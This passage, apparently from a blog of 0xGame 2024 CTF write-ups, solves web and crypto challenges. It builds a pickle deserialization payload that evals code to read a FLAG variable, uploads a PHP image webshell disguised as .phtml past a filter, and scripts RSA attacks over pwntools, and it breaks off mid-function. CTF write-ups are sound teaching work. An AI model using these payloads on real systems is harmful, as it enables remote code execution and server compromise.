<p>如果不太会搓的话可以先把实例化User对象的opcode用<code>pickletools.optimize(pickle.dumps())</code>生成出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    username = <span class="literal">None</span></span><br><span class="line">    password = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def __reduce__(self):</span></span><br><span class="line">    <span class="comment">#     s = &quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).getenv(&#x27;FLAG&#x27;)&quot;</span></span><br><span class="line">    <span class="comment">#     return (eval, (s,))</span></span><br><span class="line"></span><br><span class="line">user = User(<span class="string">&quot;notlus&quot;</span>)</span><br><span class="line">opcode = pickletools.optimize(pickle.dumps(user, protocol=<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(opcode.decode())</span><br><span class="line"><span class="string">&quot;&quot;&quot;ccopy_reg</span></span><br><span class="line"><span class="string">_reconstructor</span></span><br><span class="line"><span class="string">(c__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">c__builtin__</span></span><br><span class="line"><span class="string">object</span></span><br><span class="line"><span class="string">NtR(dVusername</span></span><br><span class="line"><span class="string">Vnotlus</span></span><br><span class="line"><span class="string">sb.&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后再把含有恶意代码的opcode生成出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">(V__import__(&#x27;o&#x27;+&#x27;s&#x27;).getenv(&#x27;FLAG&#x27;)</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后把两段拼接起来，然后再base64编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line">opcode=<span class="string">b&quot;&quot;&quot;ccopy_reg</span></span><br><span class="line"><span class="string">_reconstructor</span></span><br><span class="line"><span class="string">(c__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">c__builtin__</span></span><br><span class="line"><span class="string">object</span></span><br><span class="line"><span class="string">NtR(dVusername</span></span><br><span class="line"><span class="string">c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">(V__import__(&#x27;o&#x27;+&#x27;s&#x27;).getenv(&#x27;flag&#x27;)</span></span><br><span class="line"><span class="string">tRsb.&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(b64encode(opcode))</span><br></pre></td></tr></table></figure>

<img src="/2024/10/24/0xGame2024-week2/image-20241015182909037.png" class="" title="image-20241015182909037">

<h3 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h3><p>upload.php会检测上传的是否为jpg文件，所以得用图片马<code>copy evil.jpg/b+shell.php/a a.jpg</code></p>
<p>burp对图片的编码有好像问题，所以用burp发包过不了jpg图片检查（让我一度以为这题只设了jpg一个白名单，但实际上题目并没有限制文件后缀，只过滤了.php）</p>
<p>所以改用python，把文件后缀改为.phtml，<code>.phP</code>这种大写绕过不知道为啥不行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_image</span>(<span class="params">image_path, upload_url</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> image_file:</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (image_file.name, image_file, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(upload_url, files=files)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;服务器响应:&#x27;</span>, response.text)  </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;图片上传失败&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;响应内容:&#x27;</span>, response.text)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;发生错误:&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line">image_path = <span class="string">&#x27;./a.phtml&#x27;</span> </span><br><span class="line">upload_url = <span class="string">&#x27;http://8.130.84.100:50003/upload.php&#x27;</span>  </span><br><span class="line"></span><br><span class="line">upload_image(image_path, upload_url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2024/10/24/0xGame2024-week2/image-20241016135554205.png" class="" title="image-20241016135554205">

<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="baby-LFSR"><a href="#baby-LFSR" class="headerlink" title="baby_LFSR"></a>baby_LFSR</h3><p>128位的密钥流，把为1的位数全部找出来即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">Mask_seed = <span class="number">245818399386224174743537177607796459213</span></span><br><span class="line">randbits1 = <span class="number">103763907686833223776774671653901476306</span></span><br><span class="line">randbits2 = <span class="number">136523407741230013545146835206624093442</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_binarray</span>(<span class="params">num</span>):</span><br><span class="line">    bin_str = <span class="built_in">str</span>(<span class="built_in">bin</span>(num))[<span class="number">2</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(bin_str))</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin_str:</span><br><span class="line">        <span class="built_in">list</span>.append(i)</span><br><span class="line">    PadLenth = <span class="number">128</span> - <span class="built_in">len</span>(<span class="built_in">list</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(PadLenth):</span><br><span class="line">        <span class="built_in">list</span>[:<span class="number">0</span>] = [<span class="string">&#x27;0&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">c1, mask</span>):</span><br><span class="line">    state = []</span><br><span class="line">    tmp = c1.copy()<span class="comment">#把c1赋值给tmp</span></span><br><span class="line">    xor_site = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mask)):</span><br><span class="line">        <span class="keyword">if</span> mask[i] == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">            xor_site.append(i)  <span class="comment"># 参与异或操作的数组下标</span></span><br><span class="line">    xor_site = xor_site[<span class="number">1</span>:]  <span class="comment"># 排除掉第一个下标0的元素</span></span><br><span class="line">    c1_rev = c1[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mask)):<span class="comment">#数组的添加顺序&gt;&gt;</span></span><br><span class="line">        tmp.pop()<span class="comment">#删掉末尾元素</span></span><br><span class="line">        tmp[:<span class="number">0</span>] = <span class="string">&quot;?&quot;</span></span><br><span class="line"></span><br><span class="line">        xor_elements = [<span class="built_in">int</span>(tmp[i]) <span class="keyword">for</span> i <span class="keyword">in</span> xor_site <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(tmp)]</span><br><span class="line">        result = reduce(<span class="keyword">lambda</span> x, y: x ^ y, xor_elements)  <span class="comment"># 本质上是为了得到第0位</span></span><br><span class="line">        result ^= <span class="built_in">int</span>(c1_rev[j])</span><br><span class="line">        state.append(result)</span><br><span class="line"></span><br><span class="line">        tmp[<span class="number">0</span>]=result</span><br><span class="line">    <span class="keyword">return</span> state[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mask = int_to_binarray(Mask_seed)</span><br><span class="line">c1 = int_to_binarray(randbits1)</span><br><span class="line"></span><br><span class="line">c2 = int_to_binarray(randbits2)</span><br><span class="line">seed_list = (dec(c1, mask))</span><br><span class="line">seed_str = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> seed_list])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(seed_str,<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<h3 id="Diffie-Hellman"><a href="#Diffie-Hellman" class="headerlink" title="Diffie-Hellman"></a>Diffie-Hellman</h3><p>DH密钥交换协议，我直接在给出的proof.py里交互了。先算出Bob的公私钥，然后发送公钥，并用Alice的公钥计算共享密钥，最后对ct进行aes解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MD5</span>(<span class="params">m</span>):<span class="keyword">return</span> md5( <span class="built_in">str</span>(m).encode() ).digest()</span><br><span class="line"></span><br><span class="line">q, g = <span class="number">231729621296943745537732611544319081171</span>, <span class="number">429603071437807747660650115846394665687</span></span><br><span class="line">Alice_PubKey = <span class="number">106152635529536977128587145523998509477</span></span><br><span class="line">ct = <span class="string">&#x27;99cd8b37bb76e6508aed704697c261f099a00367ba2675e29066105acb4b1dbfce13a08991f16d15953c465a1ea984ad&#x27;</span></span><br><span class="line"><span class="comment">#Bob_PriKey = randint(1, q)#step1</span></span><br><span class="line"><span class="comment">#Bob_PubKey = pow(g, Bob_PriKey, q)#step1</span></span><br><span class="line"></span><br><span class="line">Bob_PriKey = <span class="number">150749250965210843287140631294635712931</span><span class="comment">#step2</span></span><br><span class="line">Bob_PubKey = <span class="number">177541133576021232732896044664090530038</span><span class="comment">#step2</span></span><br><span class="line"><span class="built_in">print</span>(Bob_PubKey,Bob_PriKey)</span><br><span class="line">share_key = <span class="built_in">pow</span>(Alice_PubKey, Bob_PriKey, q)</span><br><span class="line">cipher = AES.new(MD5(share_key), AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(ct))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="RSA-IV"><a href="#RSA-IV" class="headerlink" title="RSA-IV"></a>RSA-IV</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge0</span>(<span class="params">m</span>):</span><br><span class="line">	p = getPrime(<span class="number">150</span>)</span><br><span class="line">	q = getPrime(<span class="number">150</span>)</span><br><span class="line">	N = p * q</span><br><span class="line">	e = <span class="number">3</span></span><br><span class="line">	c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line">	<span class="keyword">return</span> (N, e, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge1</span>(<span class="params">m</span>):</span><br><span class="line">	p = getPrime(<span class="number">64</span>)</span><br><span class="line">	q = getPrime(<span class="number">64</span>)</span><br><span class="line">	N = p * q</span><br><span class="line">	e = <span class="number">0x10001</span></span><br><span class="line">	dp = inverse(e, p-<span class="number">1</span>)</span><br><span class="line">	c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line">	<span class="keyword">return</span> (N, e, c, dp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge2</span>(<span class="params">m</span>):</span><br><span class="line">	p = getPrime(<span class="number">64</span>)</span><br><span class="line">	q = getPrime(<span class="number">64</span>)</span><br><span class="line">	N = p * q</span><br><span class="line">	phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">	d = getPrime(<span class="number">21</span>)</span><br><span class="line">	e = inverse(d, phi)</span><br><span class="line">	c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line">	<span class="keyword">return</span> (N, e, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">m</span>):</span><br><span class="line">	p = getPrime(<span class="number">64</span>)</span><br><span class="line">	q = getPrime(<span class="number">64</span>)</span><br><span class="line">	N = p * q</span><br><span class="line">	e = getPrime(<span class="number">127</span>)</span><br><span class="line">	c = <span class="built_in">pow</span>(m, e , N)</span><br><span class="line">	e_= getPrime(<span class="number">127</span>)</span><br><span class="line">	c_= <span class="built_in">pow</span>(m, e_, N)</span><br><span class="line">	<span class="keyword">return</span> (N, e, c, e_, c_)</span><br></pre></td></tr></table></figure>

<p>由0到3分别是低指数攻击、dp泄露、维纳攻击、共模攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;118.195.138.159&quot;</span>  <span class="comment"># 要netcat的ip</span></span><br><span class="line">port = <span class="number">10003</span>  <span class="comment"># 端口</span></span><br><span class="line">io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    proof = io.recvuntil(<span class="string">b&quot;)&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">dict</span> = ascii_letters + digits</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> product(<span class="built_in">dict</span>, repeat=<span class="number">4</span>):</span><br><span class="line">        word = <span class="string">&quot;&quot;</span>.join(word).encode()</span><br><span class="line">        <span class="keyword">if</span> sha256((word + proof)).hexdigest() == <span class="built_in">hash</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;XXXX: &quot;</span>, word)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution0</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;input choice:\n&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">    task = io.recvuntil(<span class="string">b&quot;\n&quot;</span>).decode()</span><br><span class="line">    (N, e, c) = ast.literal_eval(task)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 低指数攻击</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = c + N * k</span><br><span class="line">        result, flag = gmpy2.iroot(m, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            ans = result</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution1</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;input choice:\n&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">    task = io.recvuntil(<span class="string">b&quot;\n&quot;</span>).decode()</span><br><span class="line">    (N, e, c, dp) = ast.literal_eval(task)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dp泄露</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">            p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> N % p == <span class="number">0</span>:</span><br><span class="line">                q = N // p</span><br><span class="line">                phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                d = gmpy2.invert(e, phi)</span><br><span class="line">                ans = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution2</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;input choice:\n&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2\n&quot;</span>)</span><br><span class="line">    task = io.recvuntil(<span class="string">b&quot;\n&quot;</span>).decode()</span><br><span class="line">    (N, e, c) = ast.literal_eval(task)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 维纳攻击</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">x, y</span>):  <span class="comment"># 使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">while</span> y:</span><br><span class="line">            res.append(x // y)</span><br><span class="line">            x, y = y, x % y</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">sub_res</span>):</span><br><span class="line">        numerator, denominator = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># 从sublist的后面往前循环</span></span><br><span class="line">            denominator, numerator = numerator, i * numerator + denominator</span><br><span class="line">        <span class="keyword">return</span> denominator, numerator  <span class="comment"># 得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求解每个渐进分数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sub_fraction</span>(<span class="params">x, y</span>):</span><br><span class="line">        res = transform(x, y)</span><br><span class="line">        res = <span class="built_in">list</span>(</span><br><span class="line">            <span class="built_in">map</span>(continued_fraction, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res))))</span><br><span class="line">        )  <span class="comment"># 将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a, b, c</span>):  <span class="comment"># 由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">        par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)  <span class="comment"># 由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">        x1, x2 = (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line">        <span class="keyword">return</span> x1, x2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">        <span class="keyword">for</span> d, k <span class="keyword">in</span> sub_fraction(</span><br><span class="line">            e, n</span><br><span class="line">        ):  <span class="comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">            <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># 可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                e * d - <span class="number">1</span></span><br><span class="line">            ) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k  <span class="comment"># 这个结果就是 φ(n)</span></span><br><span class="line">            px, qy = get_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">            <span class="keyword">if</span> px * qy == n:</span><br><span class="line">                p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(</span><br><span class="line">                    <span class="built_in">int</span>(qy)</span><br><span class="line">                )  <span class="comment"># 可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">                d = gmpy2.invert(</span><br><span class="line">                    e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                )  <span class="comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line">        